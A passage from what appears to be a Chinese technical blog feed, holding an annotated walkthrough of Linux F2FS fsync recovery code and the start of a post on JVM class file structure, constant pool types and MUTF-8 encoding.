head) &#123;</span><br><span class="line">        <span class="comment">// 获取目录项的结构</span></span><br><span class="line">        entry = list_entry(<span class="keyword">this</span>, struct fsync_inode_entry, <span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// entry指向vfs inode指针指向的结构体inode中的子数据i_ino与给定ino(inode number)相等则返回目录项</span></span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;inode-&gt;i_ino == ino)</span><br><span class="line">            <span class="keyword">return</span> entry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="recover-dentry-恢复目录项"><a href="#recover-dentry-恢复目录项" class="headerlink" title="recover_dentry // 恢复目录项"></a>recover_dentry // 恢复目录项</h3><figure class="highlight plaintext"><figcaption><span>恢复目录项</span></figcaption><table><tr><td class="code"><pre><span class="line">static int recover_dentry(struct page *ipage, struct inode *inode)</span><br><span class="line">&#123;</span><br><span class="line">    // kmap函数将分配到的高端内存映射到永久内存映射区域</span><br><span class="line">    struct f2fs_node *raw_node = (struct f2fs_node *)kmap(ipage);</span><br><span class="line">    struct f2fs_inode *raw_inode = &amp;(raw_node-&gt;i);</span><br><span class="line">    struct dentry dent, parent;</span><br><span class="line">    struct f2fs_dir_entry *de;</span><br><span class="line">    struct page *page;</span><br><span class="line">    struct inode *dir;</span><br><span class="line">    int err = 0;</span><br><span class="line"></span><br><span class="line">    if (!raw_node-&gt;footer.dentry)</span><br><span class="line">        goto out;</span><br><span class="line"></span><br><span class="line">    // 获取inode所属文件的超级块指针和父索引节点号</span><br><span class="line">    dir = f2fs_iget(inode-&gt;i_sb, le32_to_cpu(raw_inode-&gt;i_pino));</span><br><span class="line">    if (IS_ERR(dir)) &#123;</span><br><span class="line">        err = -EINVAL;</span><br><span class="line">        goto out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parent.d_inode = dir; // 与该目录项关联的inode</span><br><span class="line">    dent.d_parent = &amp;parent; // 父目录的目录项</span><br><span class="line"></span><br><span class="line">    // 目录项名称</span><br><span class="line">    dent.d_name.len = le32_to_cpu(raw_inode-&gt;i_namelen);</span><br><span class="line">    dent.d_name.name = raw_inode-&gt;i_name;</span><br><span class="line"></span><br><span class="line">    // 根据以上信息找到目录项</span><br><span class="line">    de = f2fs_find_entry(dir, &amp;dent.d_name, &amp;page);</span><br><span class="line">    if (de) &#123;</span><br><span class="line">        kunmap(page);</span><br><span class="line">        f2fs_put_page(page, 0);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        f2fs_add_link(&amp;dent, inode);</span><br><span class="line">    &#125;</span><br><span class="line">    iput(dir);</span><br><span class="line">out:</span><br><span class="line">    kunmap(ipage);</span><br><span class="line">    return err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="recover-inode-恢复inode"><a href="#recover-inode-恢复inode" class="headerlink" title="recover_inode // 恢复inode"></a>recover_inode // 恢复inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">recover_inode</span><span class="params">(struct inode *inode, struct page *node_page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取节点页面的映射虚拟地址</span></span><br><span class="line">    <span class="keyword">void</span> *kaddr = page_address(node_page);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_node</span> *<span class="title">raw_node</span> =</span> (struct f2fs_node *)kaddr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_inode</span> *<span class="title">raw_inode</span> =</span> &amp;(raw_node-&gt;i);</span><br><span class="line"></span><br><span class="line">    inode-&gt;i_mode = le32_to_cpu(raw_inode-&gt;i_mode); <span class="comment">//  文件类型和访问权限</span></span><br><span class="line">    i_size_write(inode, le64_to_cpu(raw_inode-&gt;i_size)); <span class="comment">// inode所代表的文件大小</span></span><br><span class="line">    inode-&gt;i_atime.tv_sec = le32_to_cpu(raw_inode-&gt;i_atime); <span class="comment">// 文件最后一次访问时间</span></span><br><span class="line">    inode-&gt;i_ctime.tv_sec = le32_to_cpu(raw_inode-&gt;i_ctime); <span class="comment">// inode最后一次修改时间</span></span><br><span class="line">    inode-&gt;i_mtime.tv_sec = le32_to_cpu(raw_inode-&gt;i_mtime); <span class="comment">// 文件最后一次修改时间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> recover_dentry(node_page, inode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="find-fsync-dnodes-找到所有的可以恢复的dnode对应的inode"><a href="#find-fsync-dnodes-找到所有的可以恢复的dnode对应的inode" class="headerlink" title="find_fsync_dnodes // 找到所有的可以恢复的dnode对应的inode"></a>find_fsync_dnodes // 找到所有的可以恢复的dnode对应的inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">find_fsync_dnodes</span><span class="params">(struct f2fs_sb_info *sbi, struct list_head *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_ver = le64_to_cpu(sbi-&gt;ckpt-&gt;checkpoint_ver);<span class="comment">// cp版本</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">curseg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">block_t</span> blkaddr;</span><br><span class="line">    <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取当前段的节点页面</span></span><br><span class="line"><span class="comment">     * CURSEG_I因为是基于dnode进行恢复，因此是WARM NODE</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    curseg = CURSEG_I(sbi, CURSEG_WARM_NODE);</span><br><span class="line">    blkaddr = START_BLOCK(sbi, curseg-&gt;segno) + curseg-&gt;next_blkoff;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读页面 */</span></span><br><span class="line">    page = alloc_page(GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(page))</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(page);</span><br><span class="line">    lock_page(page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f2fs_readpage(sbi, page, blkaddr, READ_SYNC))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cp_ver != cpver_of_node(page)) <span class="comment">// 比较从cp版本</span></span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_fsync_dnode(page)) <span class="comment">// 前滚恢复只能恢复被fsync的node page</span></span><br><span class="line">            <span class="keyword">goto</span> next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果是NULL，则表示inode不在list中</span></span><br><span class="line"><span class="comment">         * 如不是NULL，则表示这个inode已经在list中，不需要加入了</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        entry = get_fsync_inode(head, ino_of_node(page));</span><br><span class="line">            <span class="keyword">if</span> (entry) &#123;</span><br><span class="line">                entry-&gt;blkaddr = blkaddr;</span><br><span class="line">                <span class="comment">// 如果是dentry的inode，则先恢复</span></span><br><span class="line">                <span class="keyword">if</span> (IS_INODE(page) &amp;&amp; is_dent_dnode(page))</span><br><span class="line">                    set_inode_flag(F2FS_I(entry-&gt;inode),</span><br><span class="line">                                            FI_INC_LINK);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (IS_INODE(page) &amp;&amp; is_dent_dnode(page)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (recover_inode_page(sbi, page)) &#123;</span><br><span class="line">                        err = -ENOMEM;</span><br><span class="line">                        <span class="keyword">goto</span> out;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* add this fsync inode to the list */</span></span><br><span class="line">                entry = kmem_cache_alloc(fsync_entry_slab, GFP_NOFS);</span><br><span class="line">                <span class="keyword">if</span> (!entry) &#123;</span><br><span class="line">                    err = -ENOMEM;</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                INIT_LIST_HEAD(&amp;entry-&gt;<span class="built_in">list</span>);</span><br><span class="line">                list_add_tail(&amp;entry-&gt;<span class="built_in">list</span>, head);</span><br><span class="line"></span><br><span class="line">                entry-&gt;inode = f2fs_iget(sbi-&gt;sb, ino_of_node(page));</span><br><span class="line">                <span class="keyword">if</span> (IS_ERR(entry-&gt;inode)) &#123;</span><br><span class="line">                    err = PTR_ERR(entry-&gt;inode);</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">                &#125;</span><br><span class="line">                entry-&gt;blkaddr = blkaddr;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (IS_INODE(page)) &#123;</span><br><span class="line">                err = recover_inode(entry-&gt;inode, page);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">next:</span><br><span class="line">            <span class="comment">/* check next segment */</span></span><br><span class="line">            blkaddr = next_blkaddr_of_node(page);</span><br><span class="line">            ClearPageUptodate(page);</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    unlock_page(page);</span><br><span class="line">    __free_pages(page, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="destroy-fsync-dnodes-销毁fsync-dnodes"><a href="#destroy-fsync-dnodes-销毁fsync-dnodes" class="headerlink" title="destroy_fsync_dnodes // 销毁fsync dnodes"></a>destroy_fsync_dnodes // 销毁fsync dnodes</h3><h3 id="check-index-in-prev-nodes-检查前向节点的索引"><a href="#check-index-in-prev-nodes-检查前向节点的索引" class="headerlink" title="check_index_in_prev_nodes // 检查前向节点的索引"></a>check_index_in_prev_nodes // 检查前向节点的索引</h3><h3 id="do-recover-data-恢复data-page和node-page"><a href="#do-recover-data-恢复data-page和node-page" class="headerlink" title="do_recover_data // 恢复data page和node page"></a>do_recover_data // 恢复data page和node page</h3><blockquote>
<p>首先调用<code>start_bidx_of_node</code>函数，把当前node page的起始块索引赋给start<br><code>set_new_dnode</code>建立一个vfs dnode，<code>get_dnode_of_data</code>初始化刚刚建立的dnode相关信息。<br><code>wait_on_page_writeback</code>等待页面回写<br><code>get_node_info</code>从node page获取节点信息<br><code>datablock_addr</code>获取文件名和索引<br><code>check_index_in_prev_nodes</code>检查具有以上获取的索引的前向节点<br>通过调用<code>recover_data_page</code>和<code>update_extent_cache</code>写入虚拟数据页<br>调用<code>recover_node_page</code>恢复node page</p>
</blockquote>
<h3 id="recover-data-恢复数据"><a href="#recover-data-恢复数据" class="headerlink" title="recover_data // 恢复数据"></a>recover_data // 恢复数据</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recover_data</span><span class="params">(struct f2fs_sb_info *sbi,</span></span></span><br><span class="line"><span class="params"><span class="function">                struct list_head *head, <span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_ver = le64_to_cpu(sbi-&gt;ckpt-&gt;checkpoint_ver);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">curseg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">block_t</span> blkaddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get node pages in the current segment */</span></span><br><span class="line">    curseg = CURSEG_I(sbi, type);</span><br><span class="line">    blkaddr = NEXT_FREE_BLKADDR(sbi, curseg);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read node page */</span></span><br><span class="line">    page = alloc_page(GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(page))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    lock_page(page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f2fs_readpage(sbi, page, blkaddr, READ_SYNC))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cp_ver != cpver_of_node(page))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从inodelist中取出一个entry</span></span><br><span class="line">        entry = get_fsync_inode(head, ino_of_node(page));</span><br><span class="line">        <span class="keyword">if</span> (!entry)</span><br><span class="line">            <span class="keyword">goto</span> next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 进行恢复</span></span><br><span class="line">        do_recover_data(sbi, entry-&gt;inode, page, blkaddr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;blkaddr == blkaddr) &#123;</span><br><span class="line">            iput(entry-&gt;inode);</span><br><span class="line">            list_del(&amp;entry-&gt;<span class="built_in">list</span>);</span><br><span class="line">            kmem_cache_free(fsync_entry_slab, entry);</span><br><span class="line">        &#125;</span><br><span class="line">next:</span><br><span class="line">        <span class="comment">/* check next segment */</span></span><br><span class="line">        blkaddr = next_blkaddr_of_node(page);</span><br><span class="line">        ClearPageUptodate(page);</span><br><span class="line">        &#125;</span><br><span class="line">out:</span><br><span class="line">    unlock_page(page);</span><br><span class="line">    __free_pages(page, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    allocate_new_segments(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="recover-fsync-data-恢复fsync数据"><a href="#recover-fsync-data-恢复fsync数据" class="headerlink" title="recover_fsync_data // 恢复fsync数据"></a>recover_fsync_data // 恢复fsync数据</h3><p>①首先通过<code>find_fsync_dnodes</code>函数找到所有的可以恢复的dnode对应的inode(有可能dnode就是inode本身)，放入到一个list中。  </p>
<blockquote>
<p><code>find_fsync_dnodes</code>的执行流程：通过调用<code>CURSEG_I</code>和<code>START_BLOCK</code>函数获取当前段（segment）的node pages，再调用alloc_page读取node pages，把可恢复的dnode对应的inode添加到list中，再检查下个段（segment）。  </p>
</blockquote>
<p>②恢复数据：恢复inode list里面的所有的node page</p>
]]></content>
      <categories>
        <category>内核</category>
      </categories>
      <tags>
        <tag>F2FS</tag>
        <tag>Linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解JVM字节码</title>
    <url>/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    <content><![CDATA[<h2 id="1-深入剖析class文件结构"><a href="#1-深入剖析class文件结构" class="headerlink" title="1 深入剖析class文件结构"></a>1 深入剖析class文件结构</h2><h3 id="1-1-初探class文件"><a href="#1-1-初探class文件" class="headerlink" title="1.1 初探class文件"></a>1.1 初探class文件</h3><p>在IDEA中编写代码并运行后，就会自动在out目录下生成对应的class文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用010Editor查看class文件</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211229095649390.png" alt="image-20211229095649390"></p>
<h3 id="1-2-class文件结构"><a href="#1-2-class文件结构" class="headerlink" title="1.2 class文件结构"></a>1.2 class文件结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">classFile &#123;</span><br><span class="line">    u4              magic;  								<span class="comment">// 魔数</span></span><br><span class="line">    u2              minor_version; 							<span class="comment">// 副版本号</span></span><br><span class="line">    u2              major_version; 							<span class="comment">// 主版本号</span></span><br><span class="line">    u2              constant_pool_count;						</span><br><span class="line">    cp_info         constant_pool[constant_pool_count<span class="number">-1</span>]; 	<span class="comment">// 常量池</span></span><br><span class="line">    u2              access_flags; 							<span class="comment">// 类访问标记</span></span><br><span class="line">    u2              this_class; 							<span class="comment">// 类索引</span></span><br><span class="line">    u2              super_class; 							<span class="comment">// 超类索引 </span></span><br><span class="line">    u2              interfaces_count;</span><br><span class="line">    u2              interfaces[interfaces_count]; 			<span class="comment">// 接口表索引</span></span><br><span class="line">    u2              fields_count;</span><br><span class="line">    field_info      fields[fields_count]; 					<span class="comment">// 字段表</span></span><br><span class="line">    u2              methods_count;</span><br><span class="line">    method_info     methods[methods_count]; 				<span class="comment">// 方法表</span></span><br><span class="line">    u2              attributes_count;</span><br><span class="line">    attribute_info  attributes[attributes_count]; 			<span class="comment">// 属性表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="1-2-1-魔数"><a href="#1-2-1-魔数" class="headerlink" title="1.2.1 魔数"></a>1.2.1 魔数</h4><p>可以从上文看到Hello.class的魔数是四字节的0xCAFEBABE（咖啡宝贝？）</p>
<p>魔数是JVM识别class文件的标志，虚拟机在加载类文件之前会检查魔数是否正确，否则抛出<code>java.lang.ClassFormatError</code>异常，比如将魔数改为0xCAFEBABB</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211229102108725.png" alt="image-20211229102108725"></p>
<p>然后在终端运行修改过的Hello.class，（注意如果直接IDEA运行会重新生成class文件并覆盖旧的）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java Hello</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211229102509877.png" alt="image-20211229102509877"></p>
<h4 id="1-2-2-版本号"><a href="#1-2-2-版本号" class="headerlink" title="1.2.2 版本号"></a>1.2.2 版本号</h4><p>0x0034表示主版本号为52（0x34），虚拟机解析时可以知道这是一个Java 8编译出的类。如果类文件版本高于JVM版本，加载类时会抛出异常<code>java.lang.UnsupportedClassVersionError</code></p>
<hr>
<h5 id="关于版本号"><a href="#关于版本号" class="headerlink" title="关于版本号"></a>关于版本号</h5><p>每次Java发布大版本，主版本号就会加1，比如Java 8是52，Java 9是53</p>
<hr>
<p>我们把主版本号改成53（0x35），然后终端运行一下修改后的类文件</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211229103408691.png" alt="image-20211229103408691"></p>
<h4 id="1-2-3-常量池"><a href="#1-2-3-常量池" class="headerlink" title="1.2.3 常量池"></a>1.2.3 常量池</h4><h5 id="一、常量池是做什么用的？"><a href="#一、常量池是做什么用的？" class="headerlink" title="一、常量池是做什么用的？"></a>一、常量池是做什么用的？</h5><p>像0这样的简单常用的操作数，会被内嵌到字节码中。如果操作数比较大或者是字符串常量，class文件就会将其存储在常量池，使用时，根据索引位置来查找。</p>
<h5 id="二、常量池大小"><a href="#二、常量池大小" class="headerlink" title="二、常量池大小"></a>二、常量池大小</h5><p>比如大小为n时，真正有效的索引是1~n-1，因为0属于保留索引。</p>
<h5 id="三、常量池项（cp-info）集合"><a href="#三、常量池项（cp-info）集合" class="headerlink" title="三、常量池项（cp_info）集合"></a>三、常量池项（cp_info）集合</h5><p>最多包含n-1（因为long和double类型的常量会占用两个索引位置）</p>
<h5 id="四、每个常量项——cp-info的结构"><a href="#四、每个常量项——cp-info的结构" class="headerlink" title="四、每个常量项——cp_info的结构"></a>四、每个常量项——cp_info的结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cp_info &#123;</span><br><span class="line">    u1 tag; <span class="comment">// 类型</span></span><br><span class="line">    u1 info[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="五、常量池类型"><a href="#五、常量池类型" class="headerlink" title="五、常量池类型"></a>五、常量池类型</h5><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>tag值</th>
</tr>
</thead>
<tbody>
<tr>
<td>CONSTANT_Utf8_info</td>
<td>1</td>
</tr>
<tr>
<td>CONSTANT_Integer_info</td>
<td>3</td>
</tr>
<tr>
<td>CONSTANT_Flaot_info</td>
<td>4</td>
</tr>
<tr>
<td>CONSTANT_Long_info</td>
<td>5</td>
</tr>
<tr>
<td>CONSTANT_Double_info</td>
<td>6</td>
</tr>
<tr>
<td>CONSTANT_Class_info</td>
<td>7</td>
</tr>
<tr>
<td>CONSTANT_String_info</td>
<td>8</td>
</tr>
<tr>
<td>CONSTANT_Fieldref_info</td>
<td>9</td>
</tr>
<tr>
<td>CONSTANT_Methodref_info</td>
<td>10</td>
</tr>
<tr>
<td>CONSTANT_InterfaceMethodref_info</td>
<td>11</td>
</tr>
<tr>
<td>CONSTANT_NameAndType_info</td>
<td>12</td>
</tr>
<tr>
<td>CONSTANT_MethodHandle_info</td>
<td>15</td>
</tr>
<tr>
<td>CONSTANT_MethodType_info</td>
<td>16</td>
</tr>
<tr>
<td>CONSTANT_InvokeDynamic_info</td>
<td>18</td>
</tr>
</tbody>
</table>
</div>
<p>（1）查看类文件Hello.class常量池的方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javap -v Hello</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211229152410890.png" alt="image-20211229152410890"></p>
<h5 id="六、CONSTANT-Integer-info和CONSTANT-Flaot-info"><a href="#六、CONSTANT-Integer-info和CONSTANT-Flaot-info" class="headerlink" title="六、CONSTANT_Integer_info和CONSTANT_Flaot_info"></a>六、CONSTANT_Integer_info和CONSTANT_Flaot_info</h5><p>这两种常量都是4字节的。其结构分别如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONSTANT_Integer_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u4 bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONSTANT_Float_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u4 bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他如boolean、byte、short、char类型的变量，在常量池中都被当做int来处理。</p>
<p>有示例类<code>MyConstantTest</code>如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyConstantTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> bool = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">char</span> c = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">byte</span> b =<span class="number">66</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">short</span> s = <span class="number">67</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> i = <span class="number">68</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在终端中<code>javac MyConstantTest.java</code>生成class文件，然后拖入010Editor查看。</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211229160807279.png" alt="image-20211229160807279"></p>
<h5 id="七、CONSTANT-Long-info和CONSTANT-Double-info"><a href="#七、CONSTANT-Long-info和CONSTANT-Double-info" class="headerlink" title="七、CONSTANT_Long_info和CONSTANT_Double_info"></a>七、CONSTANT_Long_info和CONSTANT_Double_info</h5><p>这两个都是8字节。结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONSTANT_Long_info &#123;    u1 tag;    u4 high_bytes;    u4 low_bytes;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONSTANT_Double_info &#123;    u1 tag;    u4 high_bytes;    u4 low_bytes;&#125;</span><br></pre></td></tr></table></figure>
<p>示例程序如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldMain</span> </span>&#123;    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> a = Long.MAX_VALUE;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211229161606371.png" alt="image-20211229161606371"></p>
<h5 id="八、CONSTANT-Utf8-info"><a href="#八、CONSTANT-Utf8-info" class="headerlink" title="八、CONSTANT_Utf8_info"></a>八、CONSTANT_Utf8_info</h5><p>存储字符串内容，其结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONSTANT_Utf8_info &#123;    u1 tag;    u2 length; <span class="comment">// 注意，这个length不是表示字符串有多少字符，而是表示byte数组的长度    u1 bytes[length];  // 采用MUTF-8编码的字节数组&#125;</span></span><br></pre></td></tr></table></figure>
<hr>
<h6 id="什么是MUTF-8编码"><a href="#什么是MUTF-8编码" class="headerlink" title="什么是MUTF-8编码"></a>什么是MUTF-8编码</h6><p>这要先从UTF-8编码说起。UTF-8是一种变长编码，使用1~4字节表示一个字符。规则如下:</p>
<p><a href="https://www.zhihu.com/question/23374078">参考 - 知乎 - Unicode 和 UTF-8 有什么区别？</a></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Unicode范围（十六进制）</th>
<th>UTF-8编码方式（二进制）</th>
</tr>
</thead>
<tbody>
<tr>
<td>0000 0001 - 0000 007F</td>
<td>0xxxxxxx</td>
</tr>
<tr>
<td>0000 0080 - 0000 07FF</td>
<td>110xxxxx 10xxxxxx</td>
</tr>
<tr>
<td>0000 0800 - 0000 FFFF</td>
<td>1110xxxx 10xxxxxx 10xxxxxx</td>
</tr>
<tr>
<td>0001 0000 - 0010 FFFF</td>
<td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
</tr>
</tbody>
</table>
</div>
<p>比如<code>A</code>的Unicode值是0x41在0000 0001 - 0000 007F范围内，将0x41填到7个x中，所以其UTF-8值为01000001，即0x41</p>
<p>再如<code>严</code>的<a href="http://tool.chinaz.com/tools/unicode.aspx">Unicode</a>是0x4E25，其范围在0000 0800 - 0000 FFFF，将0x4E25从低位开始填入1110xxxx 10xxxxxx 10xxxxxx的16个x中，得到其UTF-8为11100100 10111000 10100101，也即0xE4B8A5</p>
<p>MUTF-8的不同指出在于：</p>
<p>（1）MUTF-8中用两个字节表示空字符（<code>&quot;\0&quot;</code>）：把110xxxxx 10xxxxxx中的x全部填入0，也就是0xC080。而UTF-8只用一个字节，也就是0x00表示。MUTF-8这种方式的好处在于可以保证字符串中不会出现空字符，在C语言处理时不会出现意外截断。</p>
<p>（2）MUTF-8只用了标准UTF-8中的三种编码方式：单字节、两字节、三字节，没有用到四字节。需要编码超过0000 FFFF的字符时，Java使用“代理对”通过两个字符来表示。</p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldMain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String x = <span class="string">&quot;\0&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String y = <span class="string">&quot;\uD83D\uDE02&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>y</code>是笑哭的emoji</p>
<p>将其编译为字节码后，先用<code>javap -v HelloWorldMain.class</code>查看常量池</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230095140759-16408687902141.png" alt="image-20211230095140759"></p>
<p>拖到010Editor查看</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230095331309-16408687902152.png" alt="image-20211230095331309"></p>
